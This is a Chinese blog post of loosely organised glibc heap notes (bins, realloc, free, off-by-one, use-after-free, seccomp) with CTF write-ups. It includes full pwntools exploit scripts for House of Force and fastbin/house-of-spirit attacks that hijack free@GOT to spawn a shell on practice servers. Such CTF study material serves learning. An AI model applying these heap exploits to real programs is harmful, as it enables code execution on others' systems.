<p><strong>large bins</strong> 中一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致，具体如下：</p>
<table>
<thead>
<tr>
<th align="left">组</th>
<th align="left">数量</th>
<th align="left">公差</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">32</td>
<td align="left">64B</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">16</td>
<td align="left">512B</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">8</td>
<td align="left">4096B</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">4</td>
<td align="left">32768B</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left">2</td>
<td align="left">262144B</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left">1</td>
<td align="left">不限制</td>
</tr>
</tbody></table>
<h3 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h3><h4 id="realloc-malloc-calloc"><a href="#realloc-malloc-calloc" class="headerlink" title="realloc malloc calloc"></a>realloc malloc calloc</h4><p>通常来说堆是通过调用 glibc 函数 malloc 进行分配的，在某些情况下会使用 calloc 分配。calloc 与 malloc 的区别是 calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的。</p>
<pre class="language-c" data-language="c"><code class="language-c">calloc(0x20);
//等同于
ptr=malloc(0x20);
memset(ptr,0,0x20);
1234</code></pre>

<p>除此之外，还有一种分配是经由 realloc 进行的，realloc 函数可以身兼 malloc 和 free 两个函数的功能。<br>realloc 的操作并不是像字面意义上那么简单，其内部会根据不同的情况进行不同操作<br>当 realloc(ptr,size) 的 size 不等于 ptr 的 size 时<br>如果申请 size &gt; 原来 size<br>如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小<br>如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size)<br>如果申请 size &lt; 原来 size<br>如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变<br>如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分<br>当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)<br>当 realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作</p>
<h3 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h3><p>free()函数free掉chunk时先判断 chunk 的大小和所处的位置，若 chunk_size &lt;= max_fast，并且 chunk 并不位于 heap 的顶部，也就是说并不与 top chunk 相邻，则将 chunk 放到 fast bins 中，chunk 放入到 fast bins 中，释放便结束了，程序从 free()函数中返回。</p>
<h3 id="ptmalloc-的响应"><a href="#ptmalloc-的响应" class="headerlink" title="ptmalloc 的响应"></a>ptmalloc 的响应</h3><p>判断所需分配chunk的大小是否满足chunk_size &lt;= max_fast (max_fast 默认为 64B)， 如果是的话，先尝试在 fast bins 中取一个所需大小的 chunk 分配给用户。</p>
<p><em>前一个块</em>（由当前块头指针加pre_size确定），<em>后一个块</em>（由当前块头指针加size确定）。从而，在合并堆块时会存在两种情况：<em>向后合并</em>、<em>向前合并</em>。当<strong>前一个块和当前块合并时，叫做向后合并</strong>。当<strong>后一个块和当前块合并时，叫做向前合并</strong>。</p>
<h4 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h4><p>输入</p>
<ul>
<li>gets，直接读取一行，忽略 ‘\x00’</li>
<li>scanf</li>
<li>vscanf</li>
</ul>
<p>输出</p>
<ul>
<li>sprintf</li>
</ul>
<p>字符串</p>
<ul>
<li>strcpy，字符串复制，遇到 ‘\x00’ 停止</li>
<li>strcat，字符串拼接，遇到 ‘\x00’ 停止</li>
<li>bcopy</li>
</ul>
<h4 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h4><p>这一部分主要是计算我们开始写入的地址与我们所要覆盖的地址之间的距离。 <em><strong>一个常见的误区是 malloc 的参数等于实际分配堆块的大小</strong></em>，但是事实上 ptmalloc 分配出来的大小是对齐的。这个长度一般是字长的 2 倍，比如 32 位系统是 8 个字节，64 位系统是 16 个字节。但是对于不大于 2 倍字长的请求，malloc 会直接返回 2 倍字长的块也就是最小 chunk，比如 64 位系统执行malloc(0)会返回用户区域为 16 字节的块。</p>
<h2 id="HOF"><a href="#HOF" class="headerlink" title="HOF"></a>HOF</h2><p>top chunk的作用是作为后备堆空间</p>
<p>篡改top chunk的size为-1，然后劫持到任意内存</p>
<p><strong>这种攻击手段成为House of force（hof），能够进行hof攻击需要满足两个条件：</strong></p>
<ol>
<li><strong>用户能够篡改top chunk的size字段（篡改为负数或很大值）</strong></li>
<li><strong>用户可以申请任意大小的堆内存（包括负数）</strong></li>
</ol>
<h2 id="main-arena"><a href="#main-arena" class="headerlink" title="main_arena"></a>main_arena</h2><p>malloc_hook位于main_arena(如果不知道main_arena地址可以直接使用命令 x/20xg &amp;main_arena 查看内存和地址)往上，offset = 0x10:</p>
<p>unsortedbin —&gt;main_arena+88的地址</p>
<h2 id="Fast-bin"><a href="#Fast-bin" class="headerlink" title="Fast bin"></a>Fast bin</h2><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/20181129113443346.png" alt="在这里插入图片描述" loading="lazy"><br>在chunk被free的时候如果大小小于0x80会被放入fast bin<br>需要注意的是这里的prive_inuse位不会置0<br>可以在这里泄露出来heap的地址。</p>
<h2 id="Unsort-bin"><a href="#Unsort-bin" class="headerlink" title="Unsort bin"></a>Unsort bin</h2><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/20181129113608304.png" alt="在这里插入图片描述" loading="lazy"><br>在chunk合并之后大于0x80或者是大于0x80的chunk被释放之后会放入unsort bin<br>这里是双向链表连接<br>其中main_arena和libc_base之间的偏移是固定的，可以用来leak libc_base</p>
<h2 id="off-by-one-单字节溢出"><a href="#off-by-one-单字节溢出" class="headerlink" title="off by one:单字节溢出"></a>off by one:单字节溢出</h2><p><em>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节</em></p>
<h1 id="struct-pack-format-v1-v2-…"><a href="#struct-pack-format-v1-v2-…" class="headerlink" title="**struct.pack(****format***, *v1*, *v2*, *…***)***"></a><em>*<em>*struct.pack(*</em>***format*</em>*<em>*, *v1*, *v2*, *…**</em>*<em>)*</em>**</h1><p>返回一个字节对象，该对象包含根据格式字符串格式打包的值v1、v2，…。参数必须与格式要求的值完全匹配。</p>
<p>**<em>*eg:h表示*<em>short，l表示long； *</em>‘hhl’表示后面有三个参数，依次是*<em>short，short，long类型</em></em></p>
<p> **c表示 char，bytes of length 1（长度的byte数组），i表示integer 整数；’ci’*<em>表示后面有两个个参数，依次是*<em>char，integer 类型</em></em></p>
<pre class="language-python" data-language="python"><code class="language-python">&gt;&gt;&gt; from struct import *
&gt;&gt;&gt; pack('hhl', 1, 2, 3)
&gt;&gt;&gt; pack('ci', b'*', 0x12131415)</code></pre>





<h1 id="bamboobox"><a href="#bamboobox" class="headerlink" title="bamboobox"></a>bamboobox</h1><pre class="language-python" data-language="python"><code class="language-python">#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import struct

sh = process('./bamboobox')
elf = ELF('./bamboobox')
#context.log_level = "debug"

# 创建pid文件，用于gdb调试
f = open('pid', 'w')
f.write(str(proc.pidof(sh)[0]))
f.close()


def show_item():
    pass


def add_item(size, name):
    sh.sendline(str(2))
    sh.recvuntil('Please enter the length of item name:')
    sh.sendline(str(size))
    sh.recvuntil('Please enter the name of item:')
    sh.sendline(name)
    sh.recvuntil('Your choice:')


def change_item(index, length, name):
    sh.sendline(str(3))
    sh.recvuntil('Please enter the index of item:')
    sh.sendline(str(index))
    sh.recvuntil('Please enter the length of item name:')
    sh.sendline(str(length))
    sh.recvuntil('Please enter the new name of the item:')
    sh.sendline(name)
    sh.recvuntil('Your choice:')


def remove_item(index):
    sh.sendline(str(4))
    sh.recvuntil('Please enter the index of item:')
    sh.sendline(str(index))
    sh.recvuntil('Your choice:')


magic_func_addr = 0x400d49

# 清除流
sh.recvuntil('Your choice:')

# 修改top chunk

# 注意这里不能太小，否则会申请不到top_chunk
add_item(0x108, '')  # 申请的这个chunk的size为 0x110
change_item(0, 0x108 + 8 + 1, 'a'*0x108 +
            struct.pack('q', -1))  # top_chunk-&gt;size = -1

# any_address - (char *)top_chunk - 0x20
# (heap_base + 0x10)为目标地址，偏移 0x10 为了不把chunk头计算在内
# (heap_base + 0x20 + 0x110)为top_chunk 的地址
# (heap_base + 0x10) - (heap_base + 0x20 + 0x110) - 0x20 = -0x140
add_item(-0x140, '')
add_item(0x18, 'a'*8 + p64(magic_func_addr))

# 退出程序，触发magic函数
sh.sendline('5')
sh.interactive()

# 删除pid文件
os.system("rm -f pid")</code></pre>





<h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210131225707728.png" alt="image-20210131225707728" loading="lazy"></p>
<p>栈至顶向下扩展，并且栈是有界的。堆至底向上扩展，mmap 映射区 域至顶向下扩展，mmap 映射区域和堆相对扩展，直至耗尽虚拟地址空间中的剩余区域，这 种结构便于 C 运行时库使用 mmap 映射区域和堆进行内存分配</p>
<h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><p>在 64 位模式下各个区域的起始位置是什么呢？对于 AMD64 系统，内存布局采用经典 内存布局，text 的起始地址为 0x0000000000400000，堆紧接着 BSS 段向上增长，mmap 映射 区域开始位置一般设为 TASK_SIZE/3。</p>
<p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210131225918028.png" alt="image-20210131225918028" loading="lazy"></p>
<p>上图是 X86_64 下 Linux 进程的默认内存布局形式，这只是一个示意图，当前内核默认 配置下，进程的栈和 mmap 映射区域并不是从一个固定地址开始，并且每次启动时的值都 不一样，这是程序在启动时随机改变这些值的设置，使得使用缓冲区溢出进行攻击更加困难</p>
<h1 id="2021V-amp-Nctf："><a href="#2021V-amp-Nctf：" class="headerlink" title="2021V&amp;Nctf："></a>2021V&amp;Nctf：</h1><h2 id="White-Give-Flag："><a href="#White-Give-Flag：" class="headerlink" title="White_Give_Flag："></a>White_Give_Flag：</h2><p>例行检查，64位程序，保护全开6</p>
<p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/20210316193205171.png" alt="在这里插入图片描述" loading="lazy"></p>
<p>本地试运行一下，看着像堆</p>
<p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/20210316193246990.png" alt="在这里插入图片描述" loading="lazy"></p>
<p>64位ida载入</p>
<p>main（）</p>
<p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/20210316195712928.png" alt="在这里插入图片描述" loading="lazy"></p>
<p>sub_E5A</p>
<p><img src="https://img-blog.csdnimg.cn/20210316194820280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p>
<p>qword_2010120数组中存放着5个字符串，对应菜单的5个选项。而且这个函数执行完后会在chunk中遗留flag的值</p>
<p>sub_F07</p>
<p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/20210316194820280.png" alt="在这里插入图片描述" loading="lazy"></p>
<p>读取菜单选项的函数返回的是 read() 的返回值⽽不是 atoi() 的返回值，根据返回值打印<br>qword_202120 中的字符串</p>
<p>通过add函数，可以看到堆的指针存放在qword_202100中，qword_202120 上⽅是堆指针，我们通过puts(qword_202120[-1])来输出chunk[3]里的内容</p>
<p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/20210316200716695.png" alt="在这里插入图片描述" loading="lazy"></p>
<p>malloc 随机 size 写 flag 时，size 的范围是 [0x300, 0x500]。add 到 chunk[3] 时申请⼀个在范围内的size，如果恰好是带有 flag 的 chunk size，就可以把这个 chunk 取出来，然后 edit 填充 0x10 个字<br>符， puts(qword_202120[-1]) 就能打印出 flag。<br>size 范围不⼤，可以爆破。<br>puts(qword_202120[-1]) 需要使 read() 返回 0，也就是读到 EOF。<br>可以 ctrl+d，虽然需要爆破，但是纯⼿动操作理论上可⾏（不建议使⽤）。<br>pwntools 可以使⽤ shutdown_raw(‘send’) 关闭管道的 send ⽅向，使远程 read() 读到 EOF，返回 0。</p>
<pre class="language-python" data-language="python"><code class="language-python">from pwn import *
def menu(choice):
    r.recvuntil('choice:')
    r.sendline(choice)
def add(size):
    menu('')
    r.recvuntil('size:\n')
    r.sendline(str(size))
def edit(index,data):
    menu('111')
    r.recvuntil('index:\n')
    r.sendline(str(index))
    r.recvuntil('Content:\n')
    r.send(data)
def delete(index):
    menu('11')
    r.recvuntil('index:\n')
    r.sendline(str(index))

def show(index):
    menu('1')
while True:
    r = remote("node4.buuoj.cn",39123)
    add(0x10)
    add(0x10)
    add(0x10)
    add(0x310)
    edit(3,'x'*0x10)
    r.recvuntil('choice:')
    r.shutdown_raw('send')
    flag = r.recvline()
    log.info(flag)
    if 'vnctf{' in flag or '}' in flag:
 	    exit(0)
    r.close()
    sleep(1)

</code></pre>

<p>漏洞点在于申请chunk存储了flag信息，在free时未清空，那么在接下来我们申请chunk的时候如果能够申请到跟free过的chunk大小一致，那么存储着flag的chunk就可被申请回来，即可读出flag</p>
<h2 id="ff"><a href="#ff" class="headerlink" title="ff"></a>ff</h2><p>checksec一下</p>
<p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210410162550132.png" alt="image-20210410162550132" loading="lazy"></p>
<p>保护全开</p>
<p>ida查看</p>
<p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210410162636851.png" alt="image-20210410162636851" loading="lazy"></p>
<p>推测大概是chunk的申请、释放、打印、编辑，其中<code>show</code>函数只能够调用一次，<code>edit</code>函数只能调用两次。比较特殊的一个点就是该程序使用的<code>GLIBC 2.32</code>。</p>
<h3 id="UAF漏洞"><a href="#UAF漏洞" class="headerlink" title="UAF漏洞"></a>UAF漏洞</h3><p>1、内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。<br>2、内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。<br>3、内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</p>
<pre class="language-none"><code class="language-none">0804b000-0804c000 rw-p 00000000 00:00 0          [heap]</code></pre>

<ul>
<li>0x0804b000 是相应堆的起始地址</li>
<li>rw-p 表明堆具有可读可写权限，并且属于隐私数据。</li>
<li>00000000 表明文件偏移，由于这部分内容并不是从文件中映射得到的，所以为 0。</li>
<li>00:00 是主从 (Major/mirror) 的设备号，这部分内容也不是从文件中映射得到的，所以也都为 0。</li>
<li>0 表示着 Inode 号。由于这部分内容并不是从文件中映射得到的，所以为 0。</li>
</ul>
<h1 id="fastbin-1"><a href="#fastbin-1" class="headerlink" title="fastbin"></a>fastbin</h1><pre class="language-python" data-language="python"><code class="language-python">#!/usr/bin/python2
#coding=utf-8

from pwn import *
 
#p = process('./easyheap')
p = remote('node4.buuoj.cn' ,27189)
elf = ELF('./easyheap')

context.log_level = 'debug' # 设置 Log 等级

def debug(): # 调试函数 attach to gdb
	gdb.attach(p)
	pause()

def create(size,content): # 新建 heap,地址保存在 heaparray 
	p.recvuntil('Your choice :')
	p.sendline('1')
	p.recvuntil('Size of Heap : ')
	p.send(str(size))
	p.recvuntil('Content of heap:')
	p.send(str(content))
 
def edit(index,size,content): # 修改 heap 内容,存在堆溢出点
	p.recvuntil('Your choice :')
	p.sendline('2')
	p.recvuntil('Index :')
	p.sendline(str(index))
	p.recvuntil('Size of Heap : ')
	p.send(str(size))
	p.recvuntil('Content of heap : ')
	p.send(str(content))
 
def free(index): # 释放 heap
	p.recvuntil('Your choice :')
	p.sendline('3')
	p.recvuntil('Index :')
	p.sendline(str(index))
 
free_got = elf.got['free']
 
create(0x68,'aaaa') # chunk 0
create(0x68,'bbbb') # chunk 1
create(0x68,'cccc') # chunk 2
free(2) # 释放 heap2 让其进入 fastbin

payload = '/bin/sh\x00' + 'a' * 0x60 + p64(0x71) + p64(0x6020b0-3)
edit(1,len(payload),payload)
# 修改 heap1 内容为 '/bin/sh\x00', 以及堆溢出 heap2(freed) 修改其 fd 指针 
# 因为最后释放的是 heap1,利用 '__free_hook'(system) Getshell 
# 为什么是 0x6020b0 - 3? 这是调试出来的
# FakeChunk 若以这里为 prev_size，则 size 正好是一个 0x000000000000007f
# 可以绕过 malloc_chunk 的合法性验证 (new_chunk 的 size 位要与 bin 链表 size 一致)
# 这样就伪造出了一个 chunk

create(0x68,'aaaa') # chunk 2 (从 fastbin 里取出的)

create(0x68,'c') # chunk 3 / idx = 0 (Fake)

payload = '\xaa' * 3 + p64(0) * 4 + p64(free_got)
edit(3,len(payload),payload)
# 修改 heap3 (Fake)
# 作用是把 heaparray[0] 的地址 (原先记录的是 chunk 3 的地址) 覆写成 free_got 地址
# 这就是要在 heaparry 附近构造 Fakeheap 的原因
# 确定具体的偏移量需要动态调试 


payload = p64(elf.plt['system'])
edit(0,len(payload),payload)
# free_got 地址的作用在这里体现了
# 由于 edit() 的目标是 heaparry[] 里面的地址
# 那么本次操作将修改 free_got 为 system_plt 的地址

free(1)
# 当释放 chunk1 (内容为 '/bin/sh\0x00') 的时候
# 把 chunk1 当参数传入 free() 中执行，由于 free() 地址已经被修改成 system()
# 最后程序执行的就是 system(chunk1's content) 即 system('/bin/sh\0x00'), 成功 Getshell
 
p.interactive()</code></pre>



<p>这里我们能使用的就一个堆溢出，这样就可以通过溢出来伪造堆块或者伪造指针。既然我们的攻击方法是改写got表，就应该先把堆块的指针改写为某个函数的got地址，这样在edit的时候就是改写了got里面的内容。</p>
<p>这里用到的攻击方式是house of spirit ，利用fastbin和堆溢出，把在fastbin链尾的堆块的fd指针（正常情况下是0x0）改写为我们精心找到的fake chunk的地址，注意这个地址要在0x6020e0（堆块指针表）前面找，这样我们malloc到fake chunk之后，通过edit就能覆写堆块指针。</p>
<pre class="language-python" data-language="python"><code class="language-python">from pwn import *

context(os='linux',arch='amd64',log_level='debug')

#sh = process('./easyheap')
sh = remote("node3.buuoj.cn","28598")

sh.sendafter('Your choice :','1\n')   #0 heap
sh.sendafter('Size of Heap : ','96\n')
sh.sendafter('Content of heap:','\n')

sh.sendafter('Your choice :','1\n')   #1 heap
sh.sendafter('Size of Heap : ','96\n')
sh.sendafter('Content of heap:','\n')

sh.sendafter('Your choice :','3\n')   # free 1
sh.sendafter('Index :','1\n')

x = p64(0x0) * 13 + p64(0x71)  + p64(0x6020ad) + p64(0x0)
sh.sendafter('Your choice :','2\n')
sh.sendafter('Index :','0\n')
sh.sendafter('Size of Heap : ','1000\n')
sh.sendafter('Content of heap : ',x)

#gdb.attach(sh)

sh.sendafter('Your choice :','1\n')      #1 heap
sh.sendafter('Size of Heap : ','96\n')
sh.sendafter('Content of heap:','\n')


#gdb.attach(sh)

sh.sendafter('Your choice :','1\n')   #2 heap  (0x6020ad)
sh.sendafter('Size of Heap : ','96\n')
sh.sendafter('Content of heap:','\n')

x = 'A' * 35 + p64(0x602018)   #free_got
sh.sendafter('Your choice :','2\n')
sh.sendafter('Index :','2\n')
sh.sendafter('Size of Heap : ','1000\n')
sh.sendafter('Content of heap : ',x)


x = p64(0x400700)   #system_plt
sh.sendafter('Your choice :','2\n')
sh.sendafter('Index :','0\n')
sh.sendafter('Size of Heap : ','1000\n')
sh.sendafter('Content of heap : ',x)

x = '/bin/sh' + '\x00'
sh.sendafter('Your choice :','2\n')
sh.sendafter('Index :','1\n')
sh.sendafter('Size of Heap : ','1000\n')
sh.sendafter('Content of heap : ',x)


sh.sendafter('Your choice :','3\n')
sh.sendafter('Index :','1\n')

#gdb.attach(sh)

sh.interactive()
</code></pre>

<h1 id="linux沙箱"><a href="#linux沙箱" class="headerlink" title="linux沙箱"></a>linux沙箱</h1><h2 id="linux-seccomp"><a href="#linux-seccomp" class="headerlink" title="linux seccomp"></a>linux seccomp</h2><ol>
<li>linux的沙箱机制，可以限制进程对系统调用的访问，从系统调用号，到系统调用的参数，都可以检查和限制</li>
<li>有两种模式<ol>
<li>SECCOMP_MODE_STRICT, 进程只能访问read,write,_exit,sigreturn系统调用</li>
<li>SECCOM_MODE_FILTER，通过设置bpf规则，来过滤和检查系统调用号，和系统调用参数，来决定对进程访问系统调用的处理</li>
</ol>
</li>
<li>systemd，container都使用seccomp机制来限定对进程的对系统调用的访问权限</li>
</ol>
</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="Donate" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me money.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a href="alipay.jpg"><img loading="lazy" src="/alipay.jpg" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a href="wechat.jpg"><img loading="lazy" src="/wechat.jpg" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>Torebtr,2338442533@qq.com</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://torebtr.github.io/2021/08/31/heap-%E4%B9%B1/" title="heap学习(乱)">https://torebtr.github.io/2021/08/31/heap-%E4%B9%B1/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> unless otherwise stated.</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2021/10/29/%E8%AE%B0%E4%B8%80%E6%AC%A1lua/" rel="prev" title="pwn_lua"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">pwn_lua</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2021/08/25/how2heap/" rel="next" title="how2heap(持续更新)"><span class="post-nav-text">how2heap(持续更新)</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>点击按钮跳转 GitHub Issues 评论。</span><br><a class="hty-button hty-button--raised" id="github-issues" target="_blank" rel="noopener" href="https://github.com/Torebtr/torebtr.github.io/issues?q=is:issue+heap学习(乱)">GitHub Issues</a><a class="hty-button hty-button--raised" id="github-discussions" target="_blank" rel="noopener" href="https://github.com/Torebtr/torebtr.github.io/discussions/new">GitHub Discussions</a></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Torebtr</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v5.4.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.5.1</span></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div></body></html>